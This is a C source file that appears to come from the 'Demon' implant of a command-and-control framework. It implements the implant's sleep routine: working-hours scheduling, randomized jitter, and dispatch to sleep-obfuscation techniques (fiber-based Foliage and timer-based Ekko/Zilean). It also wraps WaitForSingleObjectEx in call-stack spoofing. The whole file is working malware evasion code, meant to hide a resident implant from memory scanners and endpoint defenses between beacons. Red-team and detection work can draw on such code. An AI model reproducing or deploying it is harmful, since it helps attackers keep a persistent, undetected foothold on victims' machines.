#include <Demon.h>

#include <common/Macros.h>
#include <core/SleepObf.h>
#include <core/Win32.h>
#include <core/MiniStd.h>
#include <core/Thread.h>

#include <rpcndr.h>
#include <ntstatus.h>

UINT32 SleepTime(
    VOID
) {
    UINT32     SleepTime    = Instance->Config.Sleeping * 1000;
    UINT32     MaxVariation = ( Instance->Config.Jitter * SleepTime ) / 100;
    ULONG      Rand         = 0;
    UINT32     WorkingHours = Instance->Config.Transport.WorkingHours;
    SYSTEMTIME SystemTime   = { 0 };
    WORD       StartHour    = 0;
    WORD       StartMinute  = 0;
    WORD       EndHour      = 0;
    WORD       EndMinute    = 0;

    if ( ! InWorkingHours() )
    {
        /*
         * we are no longer in working hours,
         * if the SleepTime is 0, then we will assume the operator is performing some "important" task right now,
         * so we will ignore working hours, and we won't sleep
         * if the SleepTime is not 0, we will sleep until we are in working hours again
         */
        if ( SleepTime )
        {
            // calculate how much we need to sleep until we reach the start of the working hours
            SleepTime = 0;

            StartHour   = ( WorkingHours >> 17 ) & 0b011111;
            StartMinute = ( WorkingHours >> 11 ) & 0b111111;
            EndHour     = ( WorkingHours >>  6 ) & 0b011111;
            EndMinute   = ( WorkingHours >>  0 ) & 0b111111;

            Instance->Win32.GetLocalTime(&SystemTime);

            if ( SystemTime.wHour == EndHour && SystemTime.wMinute > EndMinute || SystemTime.wHour > EndHour )
            {
                // seconds until 00:00
                SleepTime += ( 24 - SystemTime.wHour - 1 ) * 60 + ( 60 - SystemTime.wMinute );
                // seconds until start of working hours from 00:00
                SleepTime += StartHour * 60 + StartMinute;
            }
            else
            {
                // seconds until start of working hours from current time
                SleepTime += ( StartHour - SystemTime.wHour ) * 60 + ( StartMinute - SystemTime.wMinute );
            }
            SleepTime *= 1000;
        }
    }
    // MaxVariation will be non-zero if sleep jitter was specified
    else if ( MaxVariation )
    {
        Rand = RandomNumber32();
        Rand = Rand % MaxVariation;

        if ( RandomBool() ) {
            SleepTime += Rand;
        } else {
            SleepTime -= Rand;
        }
    }

    return SleepTime;
}

VOID SleepObf(
    VOID
) {
    UINT32 TimeOut   = SleepTime();
    DWORD  Technique = Instance->Config.Implant.SleepMaskTechnique;

    PRINTF( "SleepObf: ENTRY TimeOut=%u ms Technique=%d Threads=%d\n",
            TimeOut, Technique, Instance->Threads )

    /* don't do any sleep obf. waste of resources */
    if ( TimeOut == 0 ) {
        PUTS( "SleepObf: TimeOut=0, skipping sleep" )
        return;
    }

#if _WIN64

    if ( Instance->Threads ) {
        PRINTF( "SleepObf: forcing technique=0 (no obf), Threads running: %d\n", Instance->Threads )
        Technique = 0;
    }

    switch ( Technique )
    {
#ifdef SLEEPOBF_USE_FOLIAGE
        case SLEEPOBF_FOLIAGE: {
            SLEEP_PARAM Param = { 0 };

            PUTS( "SleepObf: dispatch -> FOLIAGE" )
            if ( ( Param.Master = Instance->Win32.ConvertThreadToFiberEx( &Param, 0 ) ) ) {
                PRINTF( "SleepObf: ConvertThreadToFiberEx OK Master=%p\n", Param.Master )
                if ( ( Param.Slave = Instance->Win32.CreateFiberEx( 0x1000 * 6, 0, 0, C_PTR( FoliageObf ), &Param ) ) ) {
                    PRINTF( "SleepObf: CreateFiberEx OK Slave=%p, switching\n", Param.Slave )
                    Param.TimeOut = TimeOut;
                    Instance->Win32.SwitchToFiber( Param.Slave );
                    PUTS( "SleepObf: returned from fiber, deleting" )
                    Instance->Win32.DeleteFiber( Param.Slave );
                } else {
                    PUTS( "SleepObf: CreateFiberEx FAILED" )
                }
                Instance->Win32.ConvertFiberToThread( );
            } else {
                PUTS( "SleepObf: ConvertThreadToFiberEx FAILED" )
            }
            break;
        }
#endif

#ifdef SLEEPOBF_USE_TIMER
        /* timer api based sleep obfuscation */
        case SLEEPOBF_EKKO:
        case SLEEPOBF_ZILEAN: {
            PRINTF( "SleepObf: dispatch -> %s\n", Technique == SLEEPOBF_EKKO ? "EKKO" : "ZILEAN" )
            if ( ! TimerObf( TimeOut, Technique ) ) {
                PUTS( "SleepObf: TimerObf FAILED, falling back to default" )
                goto DEFAULT;
            }
            break;
        }
#endif

        /* default */
        DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
            PUTS( "SleepObf: dispatch -> WaitForSingleObjectEx (no obfuscation)" )
            SpoofFunc(
                Instance->Modules.Kernel32,
                IMAGE_SIZE( Instance->Modules.Kernel32 ),
                Instance->Win32.WaitForSingleObjectEx,
                NtCurrentProcess(),
                C_PTR( TimeOut ),
                FALSE
            );
        }
    }

#else

    // TODO: add support for sleep obf and spoofing

    Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );

#endif

    PUTS( "SleepObf: EXIT" )
}
